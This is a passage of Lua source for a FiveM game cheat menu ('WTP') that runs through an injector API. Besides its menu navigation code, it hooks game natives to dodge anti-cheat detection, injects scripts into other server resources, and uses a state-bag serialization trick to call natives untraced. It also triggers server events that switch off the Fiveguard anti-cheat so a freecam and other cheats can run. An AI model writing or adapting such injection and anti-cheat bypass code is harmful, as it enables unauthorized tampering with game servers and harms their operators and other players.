                -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, false) sendMenuMessage('setDebugMode') ]])
            elseif GetResourceState("VynxAC") == "started" then
                -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, false) sendMenuMessage('setDebugMode') ]])
            else
                MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, false) sendMenuMessage('setDebugMode') ]])
            end
            SetPauseMenuActive(false)

            for i = 0, 357 do
                if i < 0x30 or i > 0x5A then
                    DisableControlAction(0, i, true)
                end
            end
        else
            Wait(500)
        end
    end
end)

--- Scrolling function for normal navigation
---@param direction "Up"|"Down"
function WTP:ScrollOne(direction)
    if not direction or #CurrentMenu == 0 then
        return
    end

    local attempts = 0
    repeat
        if direction == "Up" then
            HoveredIndex = HoveredIndex - 1
            if HoveredIndex < 1 then HoveredIndex = #CurrentMenu end
        elseif direction == "Down" then
            HoveredIndex = HoveredIndex + 1
            if HoveredIndex > #CurrentMenu then HoveredIndex = 1 end
        end
        attempts = attempts + 1
        if attempts > 200 then break end
    until CurrentMenu[HoveredIndex] and CurrentMenu[HoveredIndex].type ~= "divider"

    if DUI then
        self:SendMessage({ action = "keydown", index = HoveredIndex - 1 })
    end
end

--- Scrolling function for scrollable/slider tab navigation
---@param direction "Left"|"Right"
function WTP:ScrollTwo(direction)
    local hoveredTab = CurrentMenu[HoveredIndex]
    if not hoveredTab then return end

    if (hoveredTab.type == "scrollable" or hoveredTab.type == "scrollable-checkbox")
        and hoveredTab.values and #hoveredTab.values > 0 then

        hoveredTab.value = hoveredTab.value or 1

        if direction == "Left" then
            hoveredTab.value = hoveredTab.value - 1
            if hoveredTab.value < 1 then hoveredTab.value = #hoveredTab.values end
        elseif direction == "Right" then
            hoveredTab.value = hoveredTab.value + 1
            if hoveredTab.value > #hoveredTab.values then hoveredTab.value = 1 end
        end

        self:UpdateElements(CurrentMenu)

        if hoveredTab.scrollType == "onScroll" and hoveredTab.onSelect then
            if hoveredTab.type == "scrollable-checkbox" then
                hoveredTab.onSelect(hoveredTab.values[hoveredTab.value], hoveredTab.checked or false)
            else
                hoveredTab.onSelect(hoveredTab.values[hoveredTab.value])
            end
        end
    elseif hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" then
        hoveredTab.value = hoveredTab.value or hoveredTab.min or 0
        local step = hoveredTab.step or 1

        if direction == "Left" then
            hoveredTab.value = math.max((hoveredTab.min or 0), hoveredTab.value - step)
        elseif direction == "Right" then
            hoveredTab.value = math.min((hoveredTab.max or 100), hoveredTab.value + step)
        end

        for _, data in pairs(MenuKeybinds) do
            if data.type == "slider-checkbox" and type(data.value) ~= "nil" and data.label == hoveredTab.label then
                if direction == "Left" then
                    data.value = math.max((hoveredTab.min or 0), hoveredTab.value - step)
                elseif direction == "Right" then
                    data.value = math.min((hoveredTab.max or 100), hoveredTab.value + step)
                else
                    return
                end
            end
        end

        self:UpdateElements(CurrentMenu)

        if hoveredTab.scrollType == "onScroll" and hoveredTab.onSelect then
            if hoveredTab.type == "slider-checkbox" then
                hoveredTab.onSelect(hoveredTab.value, hoveredTab.checked or false)
            else
                hoveredTab.onSelect(hoveredTab.value)
            end
        end
    end
end

function WTP:Enter()
    if not CurrentMenu or #CurrentMenu == 0 then return end
    local current = CurrentMenu[HoveredIndex]
    if not current then return end
    if not MenuOpenable then return end

    if current.type == "subMenu" then
        table.insert(MenuStack, { menu = CurrentMenu, categories = CurrentCategories, categoryIndex = CurrentCategoryIndex })
        table.insert(MenuLabelStack, current.label or "Submenu")

        if current.type == "Online Options" then
            WTP:UpdateListMenu()
        end

        if current.categories and type(current.categories) == "table" and #current.categories > 0 then
            CurrentCategories = current.categories
            CurrentCategoryIndex = 1
            CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or {}
            HoveredIndex = 1
            self:UpdateElements(CurrentMenu)
            return
        end

        if current.subTabs and type(current.subTabs) == "table" and #current.subTabs > 0 then
            CurrentCategories = nil
            CurrentCategoryIndex = 1
            CurrentMenu = current.subTabs
            HoveredIndex = 1
            self:UpdateElements(CurrentMenu)
            return
        end

        return
    end

    if current.type == "button" and current.onSelect and type(current.onSelect) == "function" then
        local ok, err = pcall(current.onSelect)
        if not ok then self:Debug("red", "onSelect error: " .. tostring(err)) end
        return
    end

    if current.type == "checkbox" or current.type == "scrollable-checkbox" or current.type == "slider-checkbox" then
        if current.locked then
            self:Notify("error", "WTP", "This module has been disabled due to high detection rates!", 3000)
            return
        end

        if type(current.checked) ~= "boolean" then
            current.checked = true
        else
            current.checked = not current.checked
        end

        if current.onSelect and type(current.onSelect) == "function" then
            if current.type == "scrollable-checkbox" then
                local ok, err = pcall(current.onSelect, current.values[current.value], current.checked)
                if not ok then self:Debug("red", "scrollable-checkbox onSelect error: " .. tostring(err)) end
            elseif current.type == "slider-checkbox" then
                local ok, err = pcall(current.onSelect, current.value, current.checked)
                if not ok then self:Debug("red", "slider-checkbox onSelect error: " .. tostring(err)) end
            else
                local ok, err = pcall(current.onSelect, current.checked)
                if not ok then self:Debug("red", "checkbox onSelect error: " .. tostring(err)) end
            end
        end

        self:UpdateElements(CurrentMenu)
        return
    end

    if current.type == "scrollable" or current.type == "scrollable-checkbox" then
        if current.values and type(current.values) == "table" and #current.values > 0 then
            if current.onSelect then
                current.onSelect(current.values[current.value])
            end
        end

        return
    end

    if current.type == "slider" or current.type == "slider-checkbox" then
        if current.scrollType == "onEnter" and current.onSelect then
            if current.type == "slider-checkbox" then
                current.onSelect(current.value, current.checked or false)
            else
                current.onSelect(current.value)
            end
        end
        return
    end
end

function WTP:Backspace()
    if #MenuStack > 0 then
        local last = table.remove(MenuStack)
        table.remove(MenuLabelStack)
        CurrentMenu = last.menu or ActiveMenu
        CurrentCategories = last.categories
        CurrentCategoryIndex = last.categoryIndex or 1
        HoveredIndex = 1
        self:UpdateElements(CurrentMenu)
    else
        self:HideUI()
    end
end

function WTP:PrevCategory()
    if not CurrentCategories or #CurrentCategories == 0 then return end
    CurrentCategoryIndex = CurrentCategoryIndex - 1
    if CurrentCategoryIndex < 1 then CurrentCategoryIndex = #CurrentCategories end
    CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or {}
    HoveredIndex = 1
    self:UpdateElements(CurrentMenu)
    self:SendMessage({ action = "keydown", index = HoveredIndex - 1 })
end

function WTP:NextCategory()
    if not CurrentCategories or #CurrentCategories == 0 then return end
    CurrentCategoryIndex = CurrentCategoryIndex + 1
    if CurrentCategoryIndex > #CurrentCategories then CurrentCategoryIndex = 1 end
    CurrentMenu = CurrentCategories[CurrentCategoryIndex].tabs or {}
    HoveredIndex = 1
    self:UpdateElements(CurrentMenu)
    self:SendMessage({ action = "keydown", index = HoveredIndex - 1 })
end

--------------------------------------------------------------------------------
-- Native Hook Bypass
--------------------------------------------------------------------------------
local setHooks = {}
local hookedNatives = {}
local safeLoadedScripts = {}

local function CreateHook(hookType, cb)
    setHooks[hookType] = cb
end

local function HookNative(setHash,  callback)
    hookedNatives[#hookedNatives + 1] = MachoHookNative(setHash, function(...)
        if GetCurrentResourceName() == 'lb-phone' or GetCurrentResourceName() == 'illenium-appearance' then
            return true
        end

        return callback(...)
    end)
end

HookNative(0x68EDDA28A5976D07, function()
    local resource = GetCurrentResourceName()
    return false, false
end)

HookNative(0xA571D46727E2B718, function(padIndex)
    if padIndex == 0 then
        local resource = GetCurrentResourceName()
        return false, false
    end

    return true
end)

HookNative(0x1CEA6BFDF248E5D9, function(padIndex, control)
    if control == 1 or control == 2 then
        local resource = GetCurrentResourceName()
        return false, true
    end

    return true
end)

HookNative(0xB15162CB5826E9E8, function() return false, true end) -- IsCinematicCamRendering
HookNative(0xD9D2CFFF49FAB35F, function() return false, true end) -- IsPlayerSwitchInProgress
HookNative(0x036F97C908C2B52C, function() return false, true end) -- IsCamInterpolating
HookNative(0xF5F1E89A970B7796, function() return false, true end) -- IsCinematicCamInputActive
HookNative(0xCA9D2AA3E326D720, function() return false, true end) -- IsCinematicIdleCamRendering
HookNative(0x19CAFA3C87F7C2FF, function() return false, 3 end) -- GetCamActiveViewModeContext

HookNative(0x0C515FAB3FF9EA92, function(propType, data)
    if menuInjected and propType and data then
        if propType == 'SetClient_LoadedSafeFuncs' then
            safeLoadedScripts[data] = true
        elseif propType == 'WTP.Hook' then
            data = json.decode(data)
            
            if data then
                local hookData = data.HookData

                if hookData then
                    local setHook = setHooks[hookData.HookType]

                    if setHook then
                        CreateThread(function()
                            setHook(table.unpack(hookData.SetArgs))
                        end)
                    end
                end
            end
        end
    end

    return true
end)

local stoppedResources = {}
local MainAPI = {}
MainAPI.StopResource = function(resource)
    stoppedResources[resource] = true
    MachoResourceStop(resource)
    
    MainAPI.Debug('Stopped resource', resource)
end

MainAPI.StartResource = function(resource)
    stoppedResources[resource] = nil
    MachoResourceStart(resource)
    
    MainAPI.Debug('Started resource', resource)
end

MainAPI.ResourceLoop = function(resource, pattern, w1, w2)
    CreateThread(function()
        while true do
            if pattern == "stop" then
                MachoResourceStop(resource)
                Wait(w1)

            elseif pattern == "stop_start" then
                MachoResourceStop(resource)
                Wait(w1)

                MachoResourceStart(resource)
                Wait(w2)

            else
                MachoResourceStart(resource)
                Wait(w1)

                MachoResourceStop(resource)
                Wait(w2)
            end
        end
    end)
end

--------------------------------------------------------------------------------
-- Native Bypass
--------------------------------------------------------------------------------
local function executeCode(resource, code)
    local IsRyban = GetResourceState("rryban_secure") == "started"

    if IsRyban then
        local setCode = [[
            local WTP = {}
            WTP.SafeRunNative = function(setFunc, ...)
                return setFunc(...)
            end

            ]] .. code .. [[
        ]]
        MachoInjectResourceScriptOverride(1, resource, setCode, '@citizen:/scripting/lua/scheduler.lua', 1, 999)
        return
    end

    code = [[
		local WTP = {}

		WTP.RunId = 'RUN_ID'

		WTP.StringFind = string.find
		WTP.StringChar = string.char
		WTP.StringLower = string.lower
		WTP.TableUnpack = table.unpack

		WTP.EXT_FUNCREF = 10

		WTP.PackValueExt = function(tag, data)
			local len = #data

			if len == 1 then
				return WTP.StringChar(0xD4, tag)..data
			elseif len == 2 then
				return WTP.StringChar(0xD5, tag)..data
			elseif len == 4 then
				return WTP.StringChar(0xD6, tag)..data
			elseif len == 8 then
				return WTP.StringChar(0xD7, tag)..data
			elseif len == 16 then
				return WTP.StringChar(0xD8, tag)..data
			elseif len <= 255 then
				return WTP.StringChar(0xC7, len, tag)..data
			elseif len <= 65535 then
				return WTP.StringChar(0xC8, math.floor(len / 256), len % 256, tag)..data
			end
		end

		WTP.PackValue = function(val)
			local t = val ~= nil and type(val)

			if val == nil then
				return WTP.StringChar(0xC0)
			elseif t == 'boolean' then
				return WTP.StringChar(val and 0xC3 or 0xC2)
			elseif t == 'number' then
				if val % 1 == 0 then
					if val >= 0 and val <= 127 then
						return WTP.StringChar(val)
					elseif val < 0 and val >= -32 then
						return WTP.StringChar(0x100 + val)
					elseif val >= 0 and val <= 0xFF then
						return WTP.StringChar(0xCC, val)
					elseif val >= 0 and val <= 0xFFFF then
						return WTP.StringChar(0xCD, math.floor(val / 256), val % 256)
					elseif val >= -128 and val < 0 then
						return WTP.StringChar(0xD0, 0x100 + val)
					elseif val >= -32768 and val < 0 then
						local v = 0x10000 + val
						return WTP.StringChar(0xD1, math.floor(v / 256), v % 256)
					end
				end

				local buf = string.pack('>d', val)

				return WTP.StringChar(0xCB) .. buf
			elseif t == 'string' then
				local len = #val

				if len <= 31 then
					return WTP.StringChar(0xA0 + len) .. val
				elseif len <= 255 then
					return WTP.StringChar(0xD9, len) .. val
				elseif len <= 65535 then
					return WTP.StringChar(0xDA, math.floor(len / 256), len % 256) .. val
				end
			elseif t == 'function' then
				local ref = Citizen.GetFunctionReference(val)

				if ref then
					return WTP.PackValueExt(WTP.EXT_FUNCREF, ref)
				else
					error('Cannot pack non-referenced function')
				end
			elseif t == 'table' then
				local cfxRef = rawget(val, '__cfx_functionReference')
				if cfxRef then
					local ref = Citizen.GetFunctionReference(val)
					if ref then
						return WTP.PackValueExt(WTP.EXT_FUNCREF, ref)
					end
				end

				local n = #val
				local header

				if n <= 15 then
					header = WTP.StringChar(0x90 + n)
				elseif n <= 65535 then
					header = WTP.StringChar(0xDC, math.floor(n / 256), n % 256)
				end

				local parts = {
					header
				}

				for i = 1, n do
					parts[#parts + 1] = WTP.PackValue(val[i])
				end

				return table.concat(parts)
			end
		end

		WTP.RawSafeRunNative = function(native, ...)
			local funcRef = msgpack.unpack(WTP.PackValue(native))

			return funcRef(...)
		end

		WTP.SetSafeStateBag = function(bag, key, value, synced)
			if value == nil then
				return
			end

			local payload = WTP.PackValue(value)
			if payload == nil then
				return
			end

			WTP.RawSafeRunNative(SetStateBagValue, bag, key, payload, #payload, synced)
		end

		WTP.SetSafeLocalState = function(key, value, synced)
			return WTP.SetSafeStateBag('player:'..GetPlayerServerId(PlayerId()), key, value, synced or false)
		end

		WTP.CachedSafeFuncs = {}

		WTP.GetSafeFunc = function(func)
			local safeFunc = WTP.CachedSafeFuncs[func]

			if safeFunc then
				return safeFunc
			end

			local serverId = GetPlayerServerId(PlayerId())
			local bag = 'player:'..serverId
			local key = '__cfx_stateBag::'..WTP.RunId..'::'..math.random(999999)..'::'..GetGameTimer()

			WTP.SetSafeStateBag(bag, key, func, false)

			safeFunc = Player(serverId).state[key]
			WTP.CachedSafeFuncs[func] = safeFunc

			return safeFunc
		end

		WTP.SafeRunNative = function(setNative, ...)
			local safeFunc = WTP.GetSafeFunc(setNative)

			return safeFunc(...)
		end

		WTP.SafeCall = function(cb, ...)
			local callArgs = {...}
			local createThread = WTP.GetSafeFunc(Citizen.CreateThreadNow)
			local safeCb = WTP.GetSafeFunc(cb)

			createThread(function()
				safeCb(WTP.TableUnpack(callArgs))
			end)
		end

		WTP.DeleteTrackedThread = function(threadName)
			if _G.SetClient_TrackedSafeThreads then
				local setThreadCb = _G.SetClient_TrackedSafeThreads[threadName]

				if setThreadCb then
					setThreadCb()
				end
			end
		end

		WTP.DeleteAllTrackedThreads = function()
			if _G.SetClient_TrackedSafeThreads then
				local setTrackedThreads = {}
				
				for threadName, setThreadCb in pairs(_G.SetClient_TrackedSafeThreads) do
					if setThreadCb then
						setTrackedThreads[#setTrackedThreads + 1] = setThreadCb
					end
				end

				_G.SetClient_TrackedSafeThreads = nil
				
				for i = 1, #setTrackedThreads do
					WTP.SafeCall(setTrackedThreads[i])
				end
			end
		end

		WTP.CreateTrackedThread = function(threadName, setHandlers)
			WTP.DeleteTrackedThread(threadName)

			WTP.SafeCall(function()
				setHandlers.isActive = true

				_G.SetClient_TrackedSafeThreads = _G.SetClient_TrackedSafeThreads or {}

				_G.SetClient_TrackedSafeThreads[threadName] = function()
					setHandlers.isActive = false

					if _G.SetClient_TrackedSafeThreads then
						_G.SetClient_TrackedSafeThreads[threadName] = nil
					end

					if setHandlers.onRemove then
						setHandlers:onRemove()
					end
				end

				setHandlers:thread()
			end)
		end

		WTP.GetEntityParent = function(entity)
			local selfPed = entity or PlayerPedId()
			local selfVehicle = GetVehiclePedIsIn(selfPed, false)
			local selfEntity = selfPed

			if selfVehicle and selfVehicle > 0 and selfPed == GetPedInVehicleSeat(selfVehicle, -1) then
				selfEntity = selfVehicle
			end

			return selfEntity
		end

		WTP.SafeWrapValue = function(setVal)
			return function(...)
				local Promise = promise.new()
				local setArgs = {...}
			
				WTP.SafeCall(function()
					Promise:resolve(setVal(WTP.TableUnpack(setArgs)))
				end)

				return Citizen.Await(Promise)
			end
		end

		local AreStringsEqual = WTP.SafeWrapValue(AreStringsEqual)

		WTP.GetSafeArgs = function(setArgs)
			for setKey, setValue in pairs(setArgs) do
				local setType = type(setValue)

				if setType == 'function' then
					setValue = tostring(setValue)
				elseif setType == 'table' then
					setValue = WTP.GetSafeArgs(setValue)
				end

				setArgs[setKey] = setValue
			end

			return setArgs
		end

		WTP.SendToHook = function(hookType, ...)
			WTP.SafeRunNative(AreStringsEqual, 'WTP.Hook', json.encode({
				HookData = {
					HookType = hookType,
					SetArgs = WTP.GetSafeArgs({...})
				}
			}))
		end

		]]..code..[[
	]]

	code = code:gsub('RUN_ID', math.random(999999)..'-'..GetGameTimer())

	MachoInjectResourceScriptOverride(1, resource, code, '@citizen:/scripting/lua/scheduler.lua', 1, 9999)
end

-- Vehicle Fly
local selectedVehicle = nil
local isVehicleFlying = false
local Control_Vehicle_Thread = nil
local Control_Vehicle = false

function IsEntityPositionFrozen(entity) return not IsEntityAMissionEntity(entity) or GetEntitySpeed(entity) == 0.0 end
function ToggleFreezeVehicle(vehicle)
    if vehicle and DoesEntityExist(vehicle) then
        local isFrozen = IsEntityPositionFrozen(vehicle)
        FreezeEntityPosition(vehicle, not isFrozen)
        if not isFrozen then
            WTP:Notify("success", "WTP", "Vehicle Frozen.", 3000)
        else
            WTP:Notify("error", "WTP", "Vehicle Unfrozen.", 3000)
        end
    else
        WTP:Notify("error", "WTP", "No vehicle selected.", 3000)
    end
end

function DrawVehicleOutline(vehicle)
    if vehicle and DoesEntityExist(vehicle) then
        SetEntityDrawOutline(vehicle, true)
        SetEntityDrawOutlineColor(88, 57, 59, 255)
    end
end

function GetClosestVehicle()
    local playerPed = PlayerPedId()
    local playerCoords = GetEntityCoords(playerPed)
    local closestVehicle = nil
    local closestDistance = 10.0
    for vehicle in EnumerateVehicles() do
        local vehicleCoords = GetEntityCoords(vehicle)
        local distance = #(playerCoords - vehicleCoords)
        if distance < closestDistance then
            closestVehicle = vehicle
            closestDistance = distance
        end
    end
    return closestVehicle
end

function EnumerateVehicles() return coroutine.wrap(function() local vehiclePool = GetGamePool('CVehicle') for i = 1, #vehiclePool do coroutine.yield(vehiclePool[i]) end end) end

function WTP:ToggleFreecam(state, speed)
    if type(state) ~= "boolean" then
        return
    end

    if state then
        FreecamEnabled = true
        MachoSendDuiMessage(DUI, json.encode({ action = "displayFreecam", visible = true, weaponIndex = CurrentWeaponIndex, vehicleIndex = CurrentVehicleIndex, mapIndex = CurrentMapDestroyerIndex, objectIndex = CurrentSpawnObjectIndex }))

        if GetResourceState("dre-scripts") == "started" then
            executeCode('dre-scripts', [[
                WTP.SafeRunNative(TriggerServerEvent, "dre-freecam:sv:fiveguardbypasson")
            ]])
        elseif GetResourceState("xevi-freecam") == "started" then
            executeCode('xevi-freecam', [[
                WTP.SafeRunNative(TriggerServerEvent, "xevi-freecam:sv:setFreecamState", true)
                WTP.SafeRunNative(TriggerServerEvent, "xevi-freecam:sv:fiveguardbypasson")
            ]])
        elseif GetResourceState("dre-freecam") == "started" then
            executeCode('dre-freecam', [[
                WTP.SafeRunNative(TriggerServerEvent, "catdev_freecam:sv:fiveguardbypasson")
            ]])
        end

        executeCode(targetSafeRes, [[
            _G.WTPFreecamSpeed = ]] .. speed .. [[

            if not _G.WTPFreecamThreadRunning then
                _G.WTPFreecamEnabled = true
                _G.WTPFreecamThreadRunning = true

                function _G.hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                local function RotationToDirection(rot)
                    local z = math.rad(rot.z)
                    local x = math.rad(rot.x)
                    local num = math.abs(math.cos(x))
                    return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                end

                local function GetRightVector(rot)
                    local z = math.rad(rot.z)
                    return vector3(math.cos(z), math.sin(z), 0.0)
                end

                local function Clamp(val, min, max)
                    if val < min then return min end
                    if val > max then return max end
                    return val
                end

                _G.RotationToDirection = RotationToDirection
                _G.GetRightVector = GetRightVector
                _G.Clamp = Clamp

                _G.hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                _G.hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                local rendering = WTP.SafeRunNative(GetRenderingCam)
                local camPos, camRot, camFov

                if rendering ~= -1 and rendering ~= nil then
                    camPos = WTP.SafeRunNative(GetCamCoord, rendering)
                    camRot = WTP.SafeRunNative(GetCamRot, rendering, 2)
                    camFov = WTP.SafeRunNative(GetCamFov, rendering)
                else
                    camPos = WTP.SafeRunNative(GetGameplayCamCoord)
                    camRot = WTP.SafeRunNative(GetGameplayCamRot, 2)
                    camFov = WTP.SafeRunNative(GetGameplayCamFov)
                end

                _G.WTPFreecamObject = WTP.SafeRunNative(CreateCam, "DEFAULT_SCRIPTED_CAMERA", true)
                WTP.SafeRunNative(SetCamCoord, _G.WTPFreecamObject, camPos.x, camPos.y, camPos.z)
                WTP.SafeRunNative(SetCamRot, _G.WTPFreecamObject, camRot.x, camRot.y, camRot.z, 2)
                WTP.SafeRunNative(SetCamFov, _G.WTPFreecamObject, camFov)
                WTP.SafeRunNative(RenderScriptCams, true, false, 0, true, true)

                local targetFov = 70.0
                local duration = 100
                local startFov = camFov
                local startTime = WTP.SafeRunNative(GetGameTimer)

                WTP.SafeRunNative(CreateThread, function()
                    while true do
                        local now = WTP.SafeRunNative(GetGameTimer)
                        local progress = (now - startTime) / duration

                        if progress >= 1.0 then
                            WTP.SafeRunNative(SetCamFov, _G.WTPFreecamObject, targetFov)
                            break
                        end

                        local eased = 1 - (1 - progress) * (1 - progress)
                        WTP.SafeRunNative(SetCamFov, _G.WTPFreecamObject, startFov + (targetFov - startFov) * eased)
                        WTP.SafeRunNative(Wait, 0)
                    end
                end)

                WTP.SafeRunNative(CreateThread, function()
                    while _G.WTPFreecamThreadRunning do
                        WTP.SafeRunNative(Wait, 0)

                        if _G.WTPFreecamObject then
                            local coords = WTP.SafeRunNative(GetCamCoord, _G.WTPFreecamObject)
                            local rot = WTP.SafeRunNative(GetCamRot, _G.WTPFreecamObject, 2)
                            local beforeSpeed = _G.WTPFreecamSpeed or 0.25
                            local speed = WTP.SafeRunNative(IsControlPressed, 0, 21) and beforeSpeed + 1.0 or beforeSpeed
                            local forward = _G.RotationToDirection(rot)
                            local right = _G.GetRightVector(rot)
                            local moveX, moveY, moveZ = 0, 0, 0

                            WTP.SafeRunNative(TaskStandStill, WTP.SafeRunNative(PlayerPedId), 10)
                            WTP.SafeRunNative(SetFocusPosAndVel, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)
                            
                            if WTP.SafeRunNative(IsControlPressed, 0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                            if WTP.SafeRunNative(IsControlPressed, 0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                            if WTP.SafeRunNative(IsControlPressed, 0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                            if WTP.SafeRunNative(IsControlPressed, 0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                            if WTP.SafeRunNative(IsControlPressed, 0, 22) then moveZ = moveZ + speed end
                            if WTP.SafeRunNative(IsControlPressed, 0, 36) then moveZ = moveZ - speed end

                            WTP.SafeRunNative(SetCamCoord, _G.WTPFreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                            local x = WTP.SafeRunNative(GetDisabledControlNormal, 0, 1)
                            local y = WTP.SafeRunNative(GetDisabledControlNormal, 0, 2)
                            local newPitch = _G.Clamp(rot.x - y * 5, -89.0, 89.0)
                            local newYaw = rot.z - x * 5
                            WTP.SafeRunNative(SetCamRot, _G.WTPFreecamObject, newPitch, rot.y, newYaw, 2)
                        end
                    end
                end)
            else
                _G.WTPFreecamEnabled = true
            end
        ]])
    else
        FreecamEnabled = false
        MachoSendDuiMessage(DUI, json.encode({ action = "displayFreecam", visible = false }))
        if GetResourceState("dre-scripts") == "started" then
            executeCode('dre-scripts', [[
                WTP.SafeRunNative(TriggerServerEvent, "dre-freecam:sv:deactivate")
            ]])
        elseif GetResourceState("xevi-freecam") == "started" then
            executeCode('xevi-freecam', [[
                WTP.SafeRunNative(TriggerServerEvent, "xevi-freecam:sv:setFreecamState", false)
                WTP.SafeRunNative(TriggerServerEvent, "xevi-freecam:sv:fiveguardbypassoff")
            ]])
        elseif GetResourceState("dre-freecam") == "started" then
            executeCode('dre-freecam', [[
                WTP.SafeRunNative(TriggerServerEvent, "catdev_freecam:sv:fiveguardbypassoff")
            ]])
        end
        executeCode(targetSafeRes, [[
            _G.WTPFreecamEnabled = false
            _G.WTPFreecamThreadRunning = false

            function _G.hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            _G.hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("Wait", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
            _G.hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

            WTP.SafeRunNative(RenderScriptCams, false, false, 0, true, true)
